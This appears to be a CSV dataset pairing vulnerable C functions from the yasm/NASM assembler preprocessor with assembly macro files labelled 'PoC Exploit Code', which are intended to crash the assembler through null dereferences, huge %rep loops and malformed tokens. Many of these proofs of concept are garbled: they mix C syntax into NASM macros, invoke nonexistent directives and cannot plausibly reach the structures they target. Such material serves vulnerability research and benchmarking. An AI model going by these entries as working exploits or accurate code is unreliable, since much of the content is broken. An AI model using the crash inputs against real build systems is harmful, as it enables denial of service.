Vulnerable Code,PoC Exploit Code,Vul_Index
,"%macro crash_yasm_section_bcs_first 0
    struc fake_yasm_section
        .bcs resb 1
    endstruc

    section .data
    fake_sect: istruc fake_yasm_section
        at fake_yasm_section.bcs, db 0x0
    iend

    %define sect fake_sect
    %assign %$result STAILQ_FIRST(&sect.bcs)
%endmacro

crash_yasm_section_bcs_first",vul8_4
,"%macro crash_yasm_section_bcs_first 0
    struc yasm_section
        .bcs resb 1
    endstruc

    section .data
    sect_instance db 0

    %assign %$sect_ptr sect_instance
    %define %$fake_bcs_ptr 0

    mov [%$sect_ptr + yasm_section.bcs], %$fake_bcs_ptr
    call yasm_section_bcs_first [%$sect_ptr]
%endmacro

crash_yasm_section_bcs_first",vul8_5
"function(Token * tline) { Token *t, *tt, **tail, *thead; tail = &thead; thead = NULL; while (tline) { if (tline->type == TOK_PREPROC_ID && (((tline->text[1] == '+' || tline->text[1] == '-') && tline->text[2]) || tline->text[1] == '%' || (tline->text[1] >= '0' && tline->text[1] <= '9'))) { char *text = NULL; int type = 0, cc; char tmpbuf[30]; char *second_text = NULL; int n, i; MMacro *mac; t = tline; tline = tline->next; second_text = strchr(t->text, ':'); mac = istk->mstk; while (mac && !mac->name) mac = mac->next_active; if (!mac) error(ERR_NONFATAL, '`%s': not in a macro call', t->text); else { if (second_text) { int end = atoi(second_text + 1) - 1; int is_fst = 1; int k; n = atoi(t->text + 1) - 1; if (end < 0) end += mac->nparam; for (k = n; k <= end; k++) { if (k >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) k = (k + mac->rotate) % mac->nparam; tt = mac->params[k]; } if (tt) { if (!is_fst && mac->paramlen[k]) { *tail = new_Token(NULL, TOK_OTHER, ',', 0); tail = &(*tail)->next; } if (mac->paramlen[k]) is_fst = 0; for (i = 0; i < mac->paramlen[k]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } else { switch (t->text[1]) { case '0': type = TOK_NUMBER; sprintf(tmpbuf, '%ld', mac->nparam); text = nasm_strdup(tmpbuf); break; case '%': type = TOK_ID; sprintf(tmpbuf, '..@%lu.', mac->unique); text = nasm_strcat(tmpbuf, t->text + 2); break; case '-': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; if (inverse_ccs[cc] == -1) { error(ERR_NONFATAL, 'condition code `%s` is not invertible', conditions[cc]); text = NULL; } else text = nasm_strdup(conditions[inverse_ccs[cc]]); } break; case '+': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; text = nasm_strdup(conditions[cc]); } break; default: n = atoi(t->text + 1) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } if (tt) { for (i = 0; i < mac->paramlen[n]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; break; } } } if (!text) { delete_Token(t); } else { *tail = t; tail = &t->next; t->type = type; nasm_free(t->text); t->text = text; t->mac = NULL; } continue; } else { t = *tail = tline; tline = tline->next; t->mac = NULL; tail = &t->next; } } *tail = NULL; t = thead; for (; t && (tt = t->next) != NULL; t = t->next) switch (t->type) { case TOK_WHITESPACE: if (tt->type == TOK_WHITESPACE) { t->next = delete_Token(tt); } break; case TOK_ID: if (tt->type == TOK_ID || tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; case TOK_NUMBER: if (tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; } return thead; }","%macro crash_macro 1
    %rep 1000000
        %1
    %endrep
%endmacro

%define excessive_param ""A""
crash_macro excessive_param",vul9_1
,"%macro crash_yasm 0
    %rep 1000000
        %define %+1 %1
    %endrep
%endmacro

%macro vulnerable_macro 1
    %1: db 0x90
%endmacro

crash_yasm
vulnerable_macro 1000000",vul9_2
,"%macro crash_macro 1
    %rep 1000000
        %+1: db 0x90
    %endrep
%endmacro

%define %+1 %+1_overflow
crash_macro %+1",vul9_3
,"%macro crash_macro 1
    %rep 1000000
        %+1: %+1
    %endrep
%endmacro

%define %+1 1
crash_macro %+1",vul9_4
,"%macro crash_macro 1
    %rep 1000000
        %+1: %+1
    %endrep
%endmacro

%define %+1 1
crash_macro %+1",vul9_5
,"%macro crash_yasm 0
    %rep 1000000
        %+1: db 'A'
    %endrep
%endmacro

%define %+1 %+999999

crash_yasm",vul9_6
"static int expr_simplify_identity(yasm_expr *e, int numterms, int *int_term, int simplify_reg_mul) { int i; int save_numterms; save_numterms = e->numterms; e->numterms = numterms; if (simplify_reg_mul || e->op != YASM_EXPR_MUL || !yasm_intnum_is_pos1(e->terms[*int_term].data.intn) || !yasm_expr__contains(e, YASM_EXPR_REG)) { if ((*int_term == 0 && numterms > 1 && expr_can_destroy_int_left(e->op, e->terms[0].data.intn)) || (*int_term > 0 && expr_can_destroy_int_right(e->op, e->terms[*int_term].data.intn))) { yasm_intnum_destroy(e->terms[*int_term].data.intn); if (*int_term != numterms-1) memmove(&e->terms[*int_term], &e->terms[*int_term+1], (numterms-1-*int_term)*sizeof(yasm_expr__item)); numterms--; *int_term = -1; } } e->numterms = save_numterms; if (numterms > 1 && *int_term != -1 && expr_is_constant(e->op, e->terms[*int_term].data.intn)) { for (i=0; i<e->numterms; i++) if (i != *int_term) expr_delete_term(&e->terms[i], 1); if (*int_term != 0) e->terms[0] = e->terms[*int_term]; numterms = 1; } if (numterms == 1 && *int_term == 0 && (e->op == YASM_EXPR_NOT || e->op == YASM_EXPR_NEG || e->op == YASM_EXPR_LNOT)) yasm_intnum_calc(e->terms[0].data.intn, e->op, NULL); if (numterms == 1) e->op = YASM_EXPR_IDENT; return numterms;","%macro trigger_expr_simplify_identity 0
    %assign %$numterms 2
    %assign %$int_term 1

    struc yasm_expr
        .op resb 1
        .numterms resd 1
        .terms resb 16
    endstruc

    %define expr yasm_expr

    [expr.numterms] dd %$numterms
    [expr.terms] db 0x00, 0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70
    [expr.terms+8] db 0x80, 0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0
    [expr.op] db 0xFF
    %assign %$int_term 3
%endmacro

trigger_expr_simplify_identity",vul10_1
,"%macro trigger_expr_simplify_identity 0
    struc yasm_expr
        .numterms resb 1
        .op       resb 1
        .terms    resq 5
    endstruc

    section .data
    expr_instance:    istruc yasm_expr
        at yasm_expr.numterms, db 5
        at yasm_expr.op, db 0
        at yasm_expr.terms, dq 0
    iend

    mov rdi, expr_instance
    mov esi, 10
    mov rdx, 0
    mov ecx, 1

    %assign i 0
    %rep 10
        db 0xFF
        %rotate 1
    %endrep
%endmacro

trigger_expr_simplify_identity",vul10_2
,"%macro crash_expr_simplify_identity 0
    struc yasm_expr
        .numterms resd 1
        .op       resd 1
        .terms    resq 2
    endstruc

    struc yasm_expr__item
        .type resb 1
        .data resq 1
    endstruc

    section .data
    expr_instance: istruc yasm_expr
        at yasm_expr.numterms, dd 2
        at yasm_expr.op, dd YASM_EXPR_MUL
        at yasm_expr.terms, dq term1
        at yasm_expr.terms+8, dq term2
    iend

    term1: istruc yasm_expr__item
        at yasm_expr__item.type, db 1
        at yasm_expr__item.data, dq 1
    iend

    term2: istruc yasm_expr__item
        at yasm_expr__item.type, db 1
        at yasm_expr__item.data, dq 1
    iend

    int_term dd 0
    %assign numterms 2
    %assign simplify_reg_mul 0

    extern expr_simplify_identity
    call expr_simplify_identity [expr_instance], numterms, [int_term], simplify_reg_mul
%endmacro

crash_expr_simplify_identity",vul10_3
,"%macro problematic_expr 0
    struc expr
        .op resb 1
        .numterms resd 1
        .terms resb 40
    endstruc

    section .data
    expr_instance: istruc expr
        at expr.op, db YASM_EXPR_MUL
        at expr.numterms, dd 2
        at expr.terms, db 1
        at expr.terms+10, db YASM_EXPR_REG
    iend

    section .text
    %define int_term 0
    %assign numterms 2
    %assign simplify_reg_mul 1

    mov eax, [expr_instance+expr.numterms]
    mov dword [eax], 1
%endmacro

problematic_expr",vul10_4
,"%macro crash_expr_simplify_identity 0
    struc yasm_expr
        .numterms resd 1
        .op       resd 1
        .terms    resb 100
    endstruc

    section .data
    expr_instance yasm_expr
    int_term dd 0

    mov dword [expr_instance.numterms], 5
    mov dword [expr_instance.op], YASM_EXPR_ADD
    mov dword [int_term], 2

    %assign i 0
    %rep 5
        mov eax, [int_term]
        cmp i, eax
        jz .skip_delete
        mov ebx, [expr_instance.terms + i*20]
        add ebx, 10
        mov [expr_instance.terms + i*20], ebx
    .skip_delete:
        %assign i i+1
    %endrep
%endmacro

crash_expr_simplify_identity",vul10_5
"do_directive(Token *tline) { int i, j, k, m, nparam, nolist; int offset; char *p, *mname, *newname; Include *inc; Context *ctx; Cond *cond; SMacro *smac, **smhead; MMacro *mmac; Token *t, *tt, *param_start, *macro_start, *last, **tptr, *origline; Line *l; struct tokenval tokval; yasm_expr *evalresult; MMacro *tmp_defining; yasm_intnum *intn; origline = tline; skip_white_(tline); if (!tok_type_(tline, TOK_PREPROC_ID) || (tline->text[1] == '%' || tline->text[1] == '$' || tline->text[1] == '!')) return NO_DIRECTIVE_FOUND; i = -1; j = elements(directives); while (j - i > 1) { k = (j + i) / 2; m = nasm_stricmp(tline->text, directives[k]); if (m == 0) { if (tasm_compatible_mode) { i = k; j = -2; } else if (k != PP_ARG && k != PP_LOCAL && k != PP_STACKSIZE) { i = k; j = -2; } break; } else if (m < 0) { j = k; } else i = k; } if (((istk->conds && !emitting(istk->conds->state)) || (istk->mstk && !istk->mstk->in_progress)) && !is_condition(i)) { return NO_DIRECTIVE_FOUND; } if (defining && i != PP_MACRO && i != PP_IMACRO && i != PP_ENDMACRO && i != PP_ENDM && (defining->name || (i != PP_ENDREP && i != PP_REP))) { return NO_DIRECTIVE_FOUND; } if (defining) { if (i == PP_MACRO || i == PP_IMACRO) { nested_mac_count++; return NO_DIRECTIVE_FOUND; } else if (nested_mac_count > 0) { if (i == PP_ENDMACRO) { nested_mac_count--; return NO_DIRECTIVE_FOUND; } } if (!defining->name) { if (i == PP_REP) { nested_rep_count++; return NO_DIRECTIVE_FOUND; } else if (nested_rep_count > 0) { if (i == PP_ENDREP) { nested_rep_count--; return NO_DIRECTIVE_FOUND; } } } } if (j != -2) { error(ERR_NONFATAL, 'unknown preprocessor directive `%s'', tline->text); return NO_DIRECTIVE_FOUND; } switch (i) { case PP_STACKSIZE: tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, '`%%stacksize'' missing size parameter'); free_tlist(origline); return DIRECTIVE_FOUND; } if (nasm_stricmp(tline->text, 'flat') == 0) { StackSize = 4; StackPointer = 'ebp'; ArgOffset = 8; LocalOffset = 4; } else if (nasm_stricmp(tline->text, 'large') == 0) { StackSize = 2; StackPointer = 'bp'; ArgOffset = 4; LocalOffset = 2; } else if (nasm_stricmp(tline->text, 'small') == 0) { StackSize = 2; StackPointer = 'bp'; ArgOffset = 6; LocalOffset = 2; } else { error(ERR_NONFATAL, '`%%stacksize'' invalid size type'); free_tlist(origline); return DIRECTIVE_FOUND; } free_tlist(origline); return DIRECTIVE_FOUND; case PP_ARG: offset = ArgOffset; do { char *arg, directive[256]; int size = StackSize; tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, '`%%arg'' missing argument parameter'); free_tlist(origline); return DIRECTIVE_FOUND; } arg = tline->text; tline = tline->next; if (!tline || tline->type != TOK_OTHER || tline->text[0] != ':') { error(ERR_NONFATAL, 'Syntax error processing `%%arg'' directive'); free_tlist(origline); return DIRECTIVE_FOUND; } tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, '`%%arg'' missing size type parameter'); free_tlist(origline); return DIRECTIVE_FOUND; } tt = tokenise(tline->text); tt = expand_smacro(tt); if (nasm_stricmp(tt->text, 'byte') == 0) { size = MAX(StackSize, 1); } else if (nasm_stricmp(tt->text, 'word') == 0) { size = MAX(StackSize, 2); } else if (nasm_stricmp(tt->text, 'dword') == 0) { size = MAX(StackSize, 4); } else if (nasm_stricmp(tt->text, 'qword') == 0) { size = MAX(StackSize, 8); } else if (nasm_stricmp(tt->text, 'tword') == 0) { size = MAX(StackSize, 10); } else { error(ERR_NONFATAL, 'Invalid size type for `%%arg'' missing directive'); free_tlist(tt); free_tlist(origline); return DIRECTIVE_FOUND; } free_tlist(tt); sprintf(directive, '`%%define %s (%s+%d)'', arg, StackPointer, offset); do_directive(tokenise(directive)); offset += size; tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; } while (tline && tline->type == TOK_OTHER && tline->text[0] == ','); free_tlist(origline); return DIRECTIVE_FOUND; case PP_LOCAL: offset = LocalOffset; do { char *local, directive[256]; int size = StackSize; tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, '`%%local'' missing argument parameter'); free_tlist(origline); return DIRECTIVE_FOUND; } local = tline->text; tline = tline->next; if (!tline || tline->type != TOK_OTHER || tline->text[0] != ':') { error(ERR_NONFATAL, 'Syntax error processing `%%local'' directive'); free_tlist(origline); return DIRECTIVE_FOUND; } tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, '`%%local'' missing size type parameter'); free_tlist(origline); return DIRECTIVE_FOUND; } tt = tokenise(tline->text); tt = expand_smacro(tt); if (nasm_stricmp(tt->text, 'byte') == 0) { size = MAX(StackSize, 1); } else if (nasm_stricmp(tt->text, 'word') == 0) { size = MAX(StackSize, 2); } else if (nasm_stricmp(tt->text, 'dword') == 0) { size = MAX(StackSize, 4); } else if (nasm_stricmp(tt->text, 'qword') == 0) { size = MAX(StackSize, 8); } else if (nasm_stricmp(tt->text, 'tword') == 0) { size = MAX(StackSize, 10); } else { error(ERR_NONFATAL, 'Invalid size type for `%%local'' missing directive'); free_tlist(tt); free_tlist(origline); return DIRECTIVE_FOUND; } free_tlist(tt); sprintf(directive, '`%%define %s (%s-%d)'', local, StackPointer, offset); do_directive(tokenise(directive)); offset += size; sprintf(directive, '`%%assign %%$localsize %%$localsize+%d'', size); do_directive(tokenise(directive)); tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; } while (tline && tline->type == TOK_OTHER && tline->text[0] == ','); free_tlist(origline); return DIRECTIVE_FOUND; case PP_CLEAR: if (tline->next) error(ERR_WARNING, 'trailing garbage after `%%clear'' ignored'); for (j = 0; j < NHASH; j++) { while (mmacros[j]) { MMacro *m2 = mmacros[j]; mmacros[j] = m2->next; free_mmacro(m2); } while (smacros[j]) { SMacro *s = smacros[j]; smacros[j] = s->next; nasm_free(s->name); free_tlist","%macro crash_directive 0
    %define fake_directive `%%define %$fake %1`
    %assign %$fake 12345
    %struc unexpected_behavior
        .field resb 1
    %endstruc
    %define %$malformed `unexpected_behavior`
    %define %$trigger %$malformed %+ .field
    %$trigger
%endmacro

crash_directive",vul11_1
,"%macro crash_directive 0
    %struc fake_token
        .type resb 1
        .text resb 256
    %endstruc

    %assign %$token fake_token
    db TOK_PREPROC_ID
    db '%%', 0
    times 256 db 0

    %use do_directive %$token
%endmacro

crash_directive",vul11_2
,"%macro crash_directive 0
    %struc invalid_directive
        .field resb 1
    %endstruc

    %define %$malformed_token `%%$malformed_token'
    %assign %$malformed_token 1

    %ifidn %$malformed_token, 1
        %error ""Simulated directive parsing error due to token type misinterpretation.""
    %endif

    %define %$trigger_error %struc
    %$trigger_error invalid_directive
%endmacro

crash_directive",vul11_3
,"%macro trigger_directive_mismatch 0
    %define tline {type: TOK_OTHER, text: ""%$!""}
    %assign %$tline.type TOK_PREPROC_ID
    %assign %$tline.text[1] '%'
    %assign %$tline.text[2] '$'
    %assign %$tline.text[3] '!'
    do_directive %$tline
%endmacro

trigger_directive_mismatch",vul11_4
,"%macro trigger_directive_mismatch 0
    %define %$fake_token {type: TOK_PREPROC_ID, text: ""%%invalid_directive""}
    %xdefine %$fake_token
    %assign %$result do_directive(%$fake_token)
%endmacro

trigger_directive_mismatch",vul11_5
,"%macro crash_yasm 0
    %struc malicious_token
        .type resb 1
        .text resq 1
    %endstruc

    %assign %$token malicious_token
    %substr %$malicious_text %$token.text 2 1000
    %define %$fake_directive `%$malicious_text'
    %use %$fake_directive
%endmacro

crash_yasm",vul11_6
,"%macro trigger_directive_mismatch 0
    %define fake_token `%%define %$fake_directive`
    %assign TOK_PREPROC_ID 1
    %define tline.text[1] '%'
    %define tline.type TOK_PREPROC_ID
    fake_token
%endmacro

trigger_directive_mismatch",vul11_7
,"%macro crash_yasm 0
    %struc faulty_token
        .type resb 1
        .text resb 2
    %endstruc

    %assign %$token faulty_token
    %substr %$malformed_text %$token.text 1, 1
    %define %$malformed_text %$malformed_text %+ %
    %define faulty_token.type TOK_PREPROC_ID
    %define faulty_token.text %$malformed_text

    %rep 1
        do_directive %$token
    %endrep
%endmacro

crash_yasm",vul11_8
,"%macro trigger_directive_mismatch 0
    %define %$malformed_token `%%$`
    %assign %$malformed_token 1
    %$malformed_token:
    %$malformed_token %$malformed_token
%endmacro

trigger_directive_mismatch",vul11_9
"expand_smacro(Token * tline) { Token *t, *tt, *mstart, **tail, *thead; SMacro *head = NULL, *m; Token **params; int *paramsize; int nparam, sparam, brackets, rescan; Token *org_tline = tline; Context *ctx; char *mname; if (org_tline) { tline = new_Token(org_tline->next, org_tline->type, org_tline->text, 0); tline->mac = org_tline->mac; nasm_free(org_tline->text); org_tline->text = NULL; } again: tail = &thead; thead = NULL; while (tline) { if ((mname = tline->text)) { if (tline->type == TOK_ID || tline->type == TOK_PREPROC_ID) ctx = get_ctx(mname, TRUE); else ctx = NULL; if (!ctx) head = smacros[hash(mname)]; else head = ctx->localmac; for (m = head; m; m = m->next) if (!mstrcmp(m->name, mname, m->casesense)) break; if (m) { mstart = tline; params = NULL; paramsize = NULL; if (m->nparam == 0) { if (!m->expansion) { if (!strcmp('__FILE__', m->name)) { long num = 0; nasm_src_get(&num, &(tline->text)); nasm_quote(&(tline->text)); tline->type = TOK_STRING; continue; } if (!strcmp('__LINE__', m->name)) { nasm_free(tline->text); make_tok_num(tline, yasm_intnum_create_int(nasm_src_get_linnum())); continue; } tline = delete_Token(tline); continue; } } else { do { t = tline->next; while (tok_type_(t, TOK_SMAC_END)) { t->mac->in_progress = FALSE; t->text = NULL; t = tline->next = delete_Token(t); } tline = t; } while (tok_type_(tline, TOK_WHITESPACE)); if (!tok_is_(tline, '(')) { tline = mstart; m = NULL; } else { int paren = 0; int white = 0; brackets = 0; nparam = 0; sparam = PARAM_DELTA; params = nasm_malloc(sparam * sizeof(Token *)); params[0] = tline->next; paramsize = nasm_malloc(sparam * sizeof(int)); paramsize[0] = 0; while (TRUE) { t = tline->next; while (tok_type_(t, TOK_SMAC_END)) { t->mac->in_progress = FALSE; t->text = NULL; t = tline->next = delete_Token(t); } tline = t; if (!tline) { error(ERR_NONFATAL, 'macro call expects terminating `)''); break; } if (tline->type == TOK_WHITESPACE && brackets <= 0) { if (paramsize[nparam]) white++; else params[nparam] = tline->next; continue; } if (tline->type == TOK_OTHER && tline->text[1] == 0) { char ch = tline->text[0]; if (ch == ',' && !paren && brackets <= 0) { if (++nparam >= sparam) { sparam += PARAM_DELTA; params = nasm_realloc(params, sparam * sizeof(Token *)); paramsize = nasm_realloc(paramsize, sparam * sizeof(int)); } params[nparam] = tline->next; paramsize[nparam] = 0; white = 0; continue; } if (ch == '{' && (brackets > 0 || (brackets == 0 && !paramsize[nparam]))) { if (!(brackets++)) { params[nparam] = tline->next; continue; } } if (ch == '}' && brackets > 0) if (--brackets == 0) { brackets = -1; continue; } if (ch == '(' && !brackets) paren++; if (ch == ')' && brackets <= 0) if (--paren < 0) break; } if (brackets < 0) { brackets = 0; error(ERR_NONFATAL, 'braces do not enclose all of macro parameter'); } paramsize[nparam] += white + 1; white = 0; } nparam++; while (m && (m->nparam != nparam || mstrcmp(m->name, mname, m->casesense))) m = m->next; if (!m) error(ERR_WARNING | ERR_WARN_MNP, 'macro `%s'' exists, but not taking %d parameters', mstart->text, nparam); } } if (m && m->in_progress) m = NULL; if (!m) { nasm_free(params); nasm_free(paramsize); tline = mstart; } else { t = tline; if (t) { tline = t->next; t->next = NULL; } tt = new_Token(tline, TOK_SMAC_END, NULL, 0); tt->mac = m; m->in_progress = TRUE; tline = tt; for (t = m->expansion; t; t = t->next) { if (t->type >= TOK_SMAC_PARAM) { Token *pcopy = tline, **ptail = &pcopy; Token *ttt, *pt; int i; ttt = params[t->type - TOK_SMAC_PARAM]; for (i = paramsize[t->type - TOK_SMAC_PARAM]; --i >= 0;) { pt = *ptail = new_Token(tline, ttt->type, ttt->text, 0); ptail = &pt->next; ttt = ttt->next; } tline = pcopy; } else { tt = new_Token(tline, t->type, t->text, 0); tline = tt; } } nasm_free(params); nasm_free(paramsize); free_tlist(mstart); continue; } } } if (tline->type == TOK_SMAC_END) { tline->mac->in_progress = FALSE; tline = delete_Token(tline); } else { t = *tail = tline; tline = tline->next; t->mac = NULL; t->next = NULL; tail = &t->next; } } t = thead; rescan = 0; while (t) { while (t && t->type != TOK_ID && t->type != TOK_PREPROC_ID) t = t->next; if (!t || !t->next) break; if (t->next->type == TOK_ID || t->next->type == TOK_PREPROC_ID || t->next->type == TOK_NUMBER) { char *p = nasm_strcat(t->text, t->next->text); nasm_free(t->text); t->next = delete_Token(t->next); t->text = p; rescan = 1; } else if (t->next->type == TOK_WHITESPACE && t->next->next && t->next->next->type == TOK_PREPROC_ID && strcmp(t->next->next->text, '%+') == 0) { int i; for (i = 1; i <= 3; i++) { if (!t->next || (i != 2 && t->next->type != TOK_WHITESPACE)) break; t->next = delete_Token(t->next); } } else t = t->next; } if (rescan) { tline = thead; goto again; } if (org_tline) { if (thead) { *org_tline = *thead; thead->text = NULL; delete_Token(thead); } else { memset(org_tline, 0, sizeof(*org_tline)); org_tline->text = NULL; org_tline->type = TOK_WHITESPACE; } thead = org_tline; } return thead;","%macro trigger_invalid_memory_access 0
    %define ttt 0x12345678
    %rep 1
        %assign ptail ttt
        %assign tline ttt
    %endrep
%endmacro

trigger_invalid_memory_access",vul12_1
,"%macro trigger_fault 0
    %rep 1
        %assign %$index 0
        %xdefine %$token_type TOK_SMAC_PARAM
        %xdefine %$token_text NULL
        %xdefine %$token_next NULL
        %xdefine %$token_prev NULL

        %define manipulate_token_list() \
            %xdefine %$token_type TOK_ID \
            %xdefine %$token_text %$token_next \
            %xdefine %$token_next %$token_prev \
            %xdefine %$token_prev %$token_next

        manipulate_token_list
    %endrep

    %rep 1
        %xdefine %$token_type TOK_SMAC_PARAM
        %xdefine %$token_text %$token_next
        %xdefine %$token_next %$token_prev
        %xdefine %$token_prev %$token_next
    %endrep
%endmacro

trigger_fault",vul12_2
,"%macro crash_expand_smacro 0
    struc bad_access
        .field resb 1
    endstruc

    %define ttt bad_access.field
    %assign ptail 0x0

    %rep 1
        db ttt
    %endrep
%endmacro

crash_expand_smacro",vul12_3
,"%macro crash_expand_smacro 0
    %define broken_token new_Token(NULL, TOK_ID, ""exploit"", 0)
    %assign broken_token.next broken_token

    %define %$token1 broken_token
    %define %$token2 broken_token
    %define %$token3 broken_token

    %rep 3
        %$token1.next
        %$token2.next
        %$token3.next
    %endrep
%endmacro

crash_expand_smacro",vul12_4
,"%macro crash_yasm 0
    %rep 1000000
        %define %$token1 %1
        %define %$token2 %2
        %define %$token3 %3
        %define %$token4 %4
        %define %$token5 %5
        %define %$token6 %6
        %define %$token7 %7
        %define %$token8 %8
        %define %$token9 %9
        %define %$token10 %10
    %endrep
%endmacro

%macro setup_tokens 0
    %assign %$idx 0
    %rep 10
        %xdefine %$token%$idx {%$idx}
        %assign %$idx %$idx+1
    %endrep
%endmacro

setup_tokens
crash_yasm %$token0, %$token1, %$token2, %$token3, %$token4, %$token5, %$token6, %$token7, %$token8, %$token9",vul12_5
"yasm_section_bcs_append(yasm_section *sect, yasm_bytecode *bc) { if (bc) { if (!sect) { yasm_error_set(YASM_ERROR_VALUE, \""Attempt to append bytecode to a NULL section or with a NULL bytecode\""); return NULL; } if (bc->callback) { bc->section = sect; STAILQ_INSERT_TAIL(&sect->bcs, bc, link); return bc; } else yasm_xfree(bc); } return (yasm_bytecode *)NULL;","%macro trigger_yasm_section_bcs_append 0
    struc fake_bytecode
        .callback resb 1
        .section resb 8
    endstruc

    struc fake_section
        .bcs resb 16
    endstruc

    %assign %$bc fake_bytecode
    %assign %$sect fake_section

    %define %$sect NULL
    %$bc.callback db 1

    yasm_section_bcs_append(%$sect, %$bc)
%endmacro

trigger_yasm_section_bcs_append",vul13_1
,"%macro trigger_null_section_dereference 0
    struc yasm_bytecode
        .callback resb 1
    endstruc

    struc yasm_section
        .bcs resb 1
    endstruc

    %define bc yasm_bytecode
    %define sect yasm_section

    %assign sect 0
    %assign bc.callback 1

    mov eax, [sect]
    mov [eax+bcs], bc
%endmacro

trigger_null_section_dereference",vul13_2
,"%macro trigger_null_section_dereference 0
    struc fake_bytecode
        .callback resb 1
        .section resb 8
    endstruc

    section .text
    %define bc fake_bytecode
    %define sect NULL

    %assign sect NULL

    call yasm_section_bcs_append sect, bc
%endmacro

trigger_null_section_dereference",vul13_3
,"%macro trigger_null_section_dereference 0
    struc bytecode callback
        .callback resb 1
    endstruc

    struc section bcs
        .bcs resb 1
    endstruc

    %define bc bytecode
    %define sect section

    %assign bc.callback 1
    %assign sect NULL

    mov eax, sect
    mov ebx, bc
    call yasm_section_bcs_append
%endmacro

trigger_null_section_dereference",vul13_4
,"%macro trigger_section_assignment_corruption 0
    struc fake_section
        .bcs resb 1
    endstruc

    struc fake_bytecode
        .callback resb 1
        .section resb 1
        .link resb 1
    endstruc

    section .data
    fake_sect: istruc fake_section
        at fake_section.bcs, db 0
    iend

    fake_bc: istruc fake_bytecode
        at fake_bytecode.callback, db 1
        at fake_bytecode.section, db 0
        at fake_bytecode.link, db 0
    iend

    %define sect fake_sect
    %define bc fake_bc

    %assign sect 0x12345678

    extern yasm_section_bcs_append
    call yasm_section_bcs_append sect, bc
%endmacro

trigger_section_assignment_corruption",vul13_5
,"%macro trigger_null_section_dereference 0
    struc yasm_section
        .bcs resb 1
    endstruc

    struc yasm_bytecode
        .callback resb 1
        .section resb 1
        .link resb 1
    endstruc

    %define sect NULL
    %define bc yasm_bytecode

    %assign bc.callback 1

    mov eax, [bc.section]
    mov [eax], sect
%endmacro

trigger_null_section_dereference",vul13_6
,"%macro crash_yasm_section_bcs_append 0
    struc bytecode
        .callback resb 1
        .section resq 1
    endstruc

    struc section
        .bcs resb 1
    endstruc

    %assign %$bc bytecode
    %assign %$sect section

    %define bc %$bc
    %define sect 0

    %ifidn sect, 0
        %error ""Attempt to append bytecode to a NULL section""
    %else
        bc.section = sect
    %endif
%endmacro

crash_yasm_section_bcs_append",vul13_7
